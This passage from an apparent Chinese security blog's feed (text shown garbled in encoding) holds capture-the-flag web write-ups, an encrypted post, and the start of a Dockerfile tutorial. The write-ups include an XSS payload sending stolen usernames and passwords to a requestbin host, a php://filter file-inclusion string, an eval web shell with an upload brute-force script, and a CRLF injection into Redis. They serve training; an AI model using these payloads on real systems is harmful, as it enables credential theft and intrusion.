åŠŸèƒ½ä¼šä»<code>Cookie</code>ä¸­å–å‡ºç”¨æˆ·åå’Œå¯†ç å¹¶èµ‹å€¼ç»™<code>username</code>å’Œ<code>password</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå†…éƒ¨JSæ¥æ„é€ payloadè¿›è¡ŒXSSï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨BUUçš„<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">requestbin</a>æ¥æ¥å—åé¦ˆã€‚ï¼ˆRequestBinæä¾›äº†ä¸€ä¸ªURLï¼Œè¯¥URLå°†æ”¶é›†å¯¹å…¶å‘å‡ºçš„è¯·æ±‚ï¼‰</p><p>åœ¨<code>feedback</code>é¡µé¢æ„é€ å¦‚ä¸‹payloadæäº¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;inpcookieut type&#x3D;&quot;text&quot; name&#x3D;&quot;password&quot;&gt;&lt;&#x2F;inpcookieut&gt;</span><br><span class="line">&lt;scricookiept scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scricookiept&gt;</span><br><span class="line">&lt;scricookiept&gt;</span><br><span class="line">var uname &#x3D; documcookieent.getElemcookieentsByName(&quot;username&quot;)[0].value;</span><br><span class="line">var passwd &#x3D; documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span><br><span class="line">var res &#x3D; uname + &quot; &quot; + passwd;</span><br><span class="line">documcookieent.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1drzn1e1&#x2F;?a&#x3D;&quot;+res;</span><br><span class="line">&lt;&#x2F;scricookiept&gt;</span><br></pre></td></tr></table></figure><p>å¯åœ¨requestbinçœ‹åˆ°å›æ˜¾ï¼š</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326224613793.png" alt></p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="http://www.ggb0n.cool/2020/03/04/GWCTF2019å¤ç°/#é¢˜ç›®åˆ†æ-2" target="_blank" rel="noopener">http://www.ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2</a></p></blockquote><h3 id="0x-05-BSidesCF-2020-Had-a-bad-day"><a href="#0x-05-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0x 05 [BSidesCF 2020]Had a bad day"></a>0x 05 [BSidesCF 2020]Had a bad day</h3><ul><li><p>è€ƒç‚¹</p><p>phpä¼ªåè®®</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><p>é¦–é¡µç‚¹å‡»å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®urlç‰¹æ€§å°è¯•base64è¯»å–æºä»£ç å¾—åˆ°å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">    if(isset($file))</span><br><span class="line">    &#123;</span><br><span class="line">        if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">            include ($file . &#39;.php&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¿…é¡»å«æœ‰woofersæˆ–meowersæˆ–indexå­—ç¬¦ä¸²,å°è¯•é¦–é¡µåŒ…å«ä¸€ä¸‹çœ‹çœ‹<code>index.php?category=woofers/../flag</code></p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328013457364.png" alt></p><p>æˆåŠŸåŒ…å«ï¼Œæ¥ä¸‹æ¥æ˜¯è¯»å–æºä»£ç ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼šphp://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®ï¼Œè¿™æ ·æäº¤çš„å‚æ•°æ—¢åŒ…å«æœ‰woofersè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿä¸ä¼šå½±å“æ­£å¸¸çš„åŒ…å«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flagçš„base64å€¼</p><h3 id="0x-06-N1CTF-2018-easy-harder-php"><a href="#0x-06-N1CTF-2018-easy-harder-php" class="headerlink" title="0x 06 [N1CTF 2018]easy_harder_php"></a>0x 06 [N1CTF 2018]easy_harder_php</h3><ul><li><p>è€ƒç‚¹</p><p>SSRF+æ–‡ä»¶åçˆ†ç ´</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>SSRFç™»å½•å‚è€ƒ[De1CTF 2019]ShellShellShellé¢˜è§£ï¼Œè¿™é‡Œè®°å½•åç»­getshellæ“ä½œã€‚åœ¨publishé¡µé¢å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œå®¡è®¡ä»£ç å‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œè€Œä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¸èƒ½æœ‰<code>&lt;?php</code>ï¼Œ è¿™å„¿å¯ä»¥ç”¨<script language="php">ä»£æ›¿ï¼Œæ–‡ä»¶ä¸Šä¼ ä¹‹åæ˜¯æ‰§è¡Œä¸€ä¸ªshå‘½ä»¤å¦‚ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ–‡ä»¶åŒ…å«çœ‹çœ‹shæ–‡ä»¶çš„å†…å®¹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($uploaded_file,$move_to_file)) &#123;</span><br><span class="line">            if(stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;&#x3D;0)</span><br><span class="line">                system(&#39;sh &#x2F;home&#x2F;nu1lctf&#x2F;clean_danger.sh&#39;);</span><br><span class="line">            return $file_true_name;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328124926898.png" alt=""></p><p>è¿™å„¿å°±éœ€è¦ç”¨åˆ°linuxçš„ä¸€ä¸ªå°trickäº†ï¼Œå½“æˆ‘ä»¬çš„æ–‡ä»¶åæ˜¯ä»¥<code>-</code>å¼€å¤´æ—¶è¿™ä¸ªå‘½ä»¤ä¼šæŠ¥é”™ä»è€Œè®©æ–‡ä»¶ä¿å­˜ä¸‹æ¥ã€‚</p><ol start="2"><li>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªä»¥<code>-</code>å¼€å¤´çš„å›¾ç‰‡ç ï¼Œç„¶åå†çˆ†ç ´å‡ºä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ„é€ shellå¦‚ä¸‹ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;[&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;]&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">echo $_POST[&quot;xxx&quot;];</span><br><span class="line">eval($_POST[&quot;xxx&quot;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"># ç”±äºé¢˜ç›®è¿‡äº†äº†æˆ‘ä»¬çš„è¾“å…¥æ‰€ä»¥ï¼Œæ²¡åŠæ³•ä½¿ç”¨å¼•å·å’Œå•å¼•å·ï¼Œæˆ‘ä»¬ç”¨&quot;[&quot;ï¼Œå’Œ&quot;]&quot;ä»£æ›¿</span><br></pre></td></tr></table></figure><p>çˆ†ç ´æ–‡ä»¶åè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">time &#x3D; int(time.time())*100</span><br><span class="line"></span><br><span class="line">request_url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line"></span><br><span class="line">cookie &#x3D; &#39;&#39;&#39;PHPSESSID&#x3D;r8gq3bh41h899tuquthqmoefe3&#39;&#39;&#39;</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">&#39;Cookie&#39;: cookie&#125;</span><br><span class="line">request_file &#x3D; &#123;&#39;pic&#39;:(&#39;-xx.jpg&#39;,open(&#39;D:&#x2F;-xx.jpg&#39;),&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url&#x3D;request_url, headers&#x3D;header,files&#x3D;request_file)# url,data,files</span><br><span class="line">print res.text</span><br><span class="line">print time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;app&#x2F;adminpic&#x2F;-xx&#123;&#125;.jpg&#39;</span><br><span class="line">for i in range(10000):</span><br><span class="line">    tmp &#x3D; time + i</span><br><span class="line">    ul &#x3D; url.format(tmp)</span><br><span class="line">    html &#x3D; requests.get(ul).status_code</span><br><span class="line">    print(html,i)</span><br><span class="line">    if html &#x3D;&#x3D; 200:</span><br><span class="line">        print(ul)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200330011355490.png" alt=""></p><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://blog.csdn.net/a3320315/article/details/104088080" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104088080</a></p></blockquote><h3 id="0x-07-SWPUCTF-2016-Web7"><a href="#0x-07-SWPUCTF-2016-Web7" class="headerlink" title="0x 07 [SWPUCTF 2016]Web7"></a>0x 07 [SWPUCTF 2016]Web7</h3><ul><li><p>è€ƒç‚¹</p><p>Python2 Urllib2å¤´éƒ¨æ³¨å…¥(CVE-2016-5699)</p></li><li><p>è§£é¢˜è¿‡ç¨‹</p></li></ul><ol><li>é¢˜ç›®æºä»£ç ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python </span><br><span class="line"># coding:utf8</span><br><span class="line">import cherrypy</span><br><span class="line">import urllib2</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">class web7:</span><br><span class="line"></span><br><span class="line">    def index(self):</span><br><span class="line">        return &quot;&lt;script&gt; window.location.href&#x3D;&#39;&#x2F;input&#39;;&lt;&#x2F;script&gt;&quot;</span><br><span class="line"></span><br><span class="line">    def input(self,url&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        file&#x3D;open(&quot;index.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        reheaders&#x3D;&quot;&quot;</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            reheaders&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            url&#x3D;cherrypy.request.params[&quot;url&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            try:</span><br><span class="line">                for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">            except Exception,e:</span><br><span class="line">                reheaders&#x3D;&quot;é”™è¯¯&quot;+str(e)</span><br><span class="line">            for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,reheaders)</span><br><span class="line">        return file</span><br><span class="line"></span><br><span class="line">    def login(self,password&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        pool &#x3D; redis.ConnectionPool(host&#x3D;&#39;127.0.0.1&#39;, port&#x3D;6379)</span><br><span class="line">        r &#x3D; redis.Redis(connection_pool&#x3D;pool)</span><br><span class="line">        re&#x3D;&quot;&quot;</span><br><span class="line">        file&#x3D;open(&quot;login.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            re&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            password&#x3D;cherrypy.request.params[&quot;password&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            if r.get(&quot;admin&quot;)&#x3D;&#x3D;password:</span><br><span class="line">                re&#x3D;open(&quot;flag&quot;,&#39;r&#39;).readline()</span><br><span class="line">            else:</span><br><span class="line">                re&#x3D;&quot;Can&#39;t find admin:&quot;+password+&quot;,fast fast fast.....&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,re)</span><br><span class="line">        return file</span><br><span class="line">cherrypy.config.update(&#123;&#39;server.socket_host&#39;: &#39;0.0.0.0&#39;,</span><br><span class="line">                        &#39;server.socket_port&#39;: 8080,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),&#39;&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç¯å¢ƒï¼šPython 2.7.5+Redis 2.6</p><p>ä¸¤ä¸ªè¾“å…¥ç‚¹ï¼Œä¸€ä¸ª<code>/input</code>å…è®¸æˆ‘ä»¬è¾“å…¥URLï¼Œç„¶åä¼šç”¨urllib2.urlopen()è®¿é—®æˆ‘ä»¬çš„URLã€‚è¿˜æœ‰ä¸€ä¸ª<code>/login</code>ï¼Œè¦æ±‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜çš„å¯†ç ï¼Œå¦‚æœä¸Redisæ•°æ®åº“ä¸­çš„å¯†ç ç›¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°Flagã€‚</p><p>æ ¹æ®urllib2.urlopen()çš„å†å²æ¼æ´ï¼š<a href="https://bugs.python.org/issue30458æ¥æ‰“å†…ç½‘" target="_blank" rel="noopener">https://bugs.python.org/issue30458æ¥æ‰“å†…ç½‘</a></p><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯urlopen()å¤„ç†URLçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„HTTPå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹</p><p>payloadï¼š<code>[http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo](http://127.0.0.1 set admin admin save :6379/foo)</code></p><p>æäº¤ä¹‹åè¿…é€Ÿç™»å…¥loginå¾—åˆ°flag</p><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/</a></p></blockquote></script></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ä¸€äº›tipsè®°å½•</title>
      <link href="/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">è¾“å…¥å¯†ç ï¼ŒæŸ¥çœ‹æ–‡ç« </label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="28aaf004cbc44fa34ce39f84200bad2262815ab53452cfebf466febb055ce73b">46b23596492c64531b09cace650cd9a917cc4147342c83ec5831cfb7deff4cc92eca58b13aa289292c1dfb41695096d20d990631909710c5c85bc60c1dd25280455736a76aac636944250effad1a500bd88802eaa4f74681db1de5d15d867b81f24f7a2875e5f2b4c0df228feba81426acb050c49c4a2840e96a7fb58d8f6da7d40250c20b1eaaaed6eaec434c4ebd717c2f7ce71a5a158172d0c8cf878e20dee064f516df21c135e50827534a73e5642445d31524f524d1df54c1aea424a812735b8982d06f4ee7038aa51749c94aed0103673a8b838419ba1ddd35bbbbe7ea9ef42514621eb5f96ec5ad002eff7e4b2608dcc4222e936bb52e6f0f33280162f09875d907ebe233110dfa29ef0af3790528086efd0affa78b8084c3ce112d76e4f4dbac75a0420babcbe6d7978c91ea62107c08d8af6e223372b3ff5fb88c498debab66283c627cdbf6bd0fa950d0eb542074d2775ac30767e8d3a64f4540a21c329f926ba77bc94f6d8f8b0c575d57e1d963f67e2c011a6edd9ee79c2be14c9b834e55549b06e1378b45427c20967ff1572f1d6498d147c53ab735765bc561a4e58d139302675d8e23b8688764e270ab2a4dde24bd46c2e6b7fd96bf268f51220e39bb5ca9564bbfb66e809961e962f406d017298a1b48373300b3dafec9ac011b00036fa270562eb85aa9f6ebc26f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerfileç¼–å†™å­¦ä¹ </title>
      <link href="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-å‰è¨€"><a href="#0x-01-å‰è¨€" class="headerlink" title="0x 01 å‰è¨€"></a>0x 01 å‰è¨€</h3><p>â€‹        é•œåƒçš„å®šåˆ¶å®é™…ä¸Šå°±æ˜¯å®šåˆ¶æ¯ä¸€å±‚æ‰€æ·»åŠ çš„é…ç½®æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸€å±‚çš„ä¿®æ”¹ã€å®‰è£…ã€æ„å»ºã€æ“ä½œçš„å‘½ä»¤éƒ½å†™å…¥ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åç”¨è¿™ä¸ªè„šæœ¬æ¥æ„å»ºã€å®šåˆ¶é•œåƒï¼Œé‚£ä¹ˆé•œåƒæ„å»ºé€æ˜æ€§çš„é—®é¢˜ã€ä½“ç§¯çš„é—®é¢˜å°±ä¼šå¾—åˆ°è§£å†³ï¼Œè¿™ä¸ªè„šæœ¬å°±æ˜¯ Dockerfile; Dockerfile  æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€æ¡æ¡çš„æŒ‡ä»¤ï¼Œæ¯ä¸€æ¡æŒ‡ä»¤æ„å»ºä¸€å±‚ï¼Œæ¯ä¸€å±‚æŒ‡ä»¤çš„å†…å®¹ï¼Œå°±æ˜¯æè¿°è¯¥å±‚åº”è¯¥å¦‚ä½•æ„å»ºï¼Œç„¶åé€šè¿‡ commit æ„æˆæ–°çš„é•œåƒã€‚</p><h3 id="0x-02-Dockerfile-å¸¸ç”¨å‚æ•°"><a href="#0x-02-Dockerfile-å¸¸ç”¨å‚æ•°" class="headerlink" title="0x 02 Dockerfile å¸¸ç”¨å‚æ•°"></a>0x 02 Dockerfile å¸¸ç”¨å‚æ•°</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>FROMï¼šæŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤,æ ¼å¼ä¸º<code>FROM image</code>æˆ–<code>FROM image:tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># å®šåˆ¶ nginx é•œåƒçš„ Dockerfile</span><br><span class="line"></span><br><span class="line">FROM nginx</span><br><span class="line">RUN echo &#39;&lt;h1&gt;Hello,Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure><p>æ³¨ï¼š Docker Hub ä¸Šæœ‰å¾ˆå¤šé«˜è´¨é‡çš„æœåŠ¡ç±»çš„å®˜æ–¹é•œåƒå¯ä»¥æ‹¿æ¥ç›´æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šnginx ã€redis ã€mysql ã€php ã€mongo \ tomcat ç­‰ï¼Œå¯ä»¥åœ¨å…¶ä¸­æ‰¾æœ€ç¬¦åˆçš„ä¸€ä¸ªè¿›è¡Œå®šåˆ¶</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN ï¼šç”¨æ¥æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤ï¼Œæ ¼å¼æœ‰ä¸¤ç§ï¼š</p><ol><li><p>shell æ ¼å¼ï¼š <code>RUN &lt;å‘½ä»¤&gt;</code>ï¼Œå°±åƒç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‘½ä»¤ä¸€æ ·</p></li><li><p>exec æ ¼å¼ï¼š<code>RUN [&quot;å¯æ‰§è¡Œæ–‡ä»¶&quot;ï¼Œâ€œå‚æ•°1â€ï¼Œâ€œå‚æ•°2â€]</code>ï¼Œæ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­çš„æ ¼å¼</p></li></ol><p>warning:æ¯ä¸€ä¸ªRUNå‘½ä»¤éƒ½ä¼šåœ¨ dockeré•œåƒä¸­æ–°å»ºä¸€å±‚ï¼Œæ‰€ä»¥åº”è¯¥å°½é‡å°‘ç”¨ RUN å‘½ä»¤ï¼Œè€Œä¸”è¦åœ¨RUN çš„æœ€åè¦åšå¿…è¦çš„æ¸…é™¤å·¥ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ä¸€å±‚æ„å»ºï¼Œå¹¶åœ¨æœ€åæ¸…ç†å‹ç¼©åŒ…ç­‰ç¼“å­˜æ–‡ä»¶</span><br><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \</span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install -y $buildDeps \</span><br><span class="line">&amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \</span><br><span class="line">&amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \</span><br><span class="line">&amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \</span><br><span class="line">&amp;&amp; rm redis.tar.gz \</span><br><span class="line">&amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span><br></pre></td></tr></table></figure><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p> COPY : ç”¨æ¥ä»æ„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­&lt;åŸè·¯å¾„&gt;çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°ä¸€å±‚é•œåƒå†…çš„ &lt;ç›®æ ‡è·¯å¾„&gt;ä½ç½®ï¼Œæ ¼å¼æœ‰ä¸¤ç§ï¼š</p><p>  1ï¼Œshell æ ¼å¼ï¼š<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;åŸè·¯å¾„&gt;...&lt;ç›®æ ‡è·¯å¾„&gt;</code></p><p>  2ï¼Œexec åˆé€‚ï¼š<code>COPY[--chown=&lt;user&gt;:&lt;group&gt;] [&quot;åŸè·¯å¾„1&quot;ï¼Œ... &quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;]</code></p><p>åŸè·¯å¾„ï¼šå¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³å¯ä»¥æ˜¯é€šé…ç¬¦</p><p>ç›®æ ‡è·¯å¾„ï¼šå¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„(å·¥ä½œç›®å½•å¯ä»¥ç”¨ WORKDIR 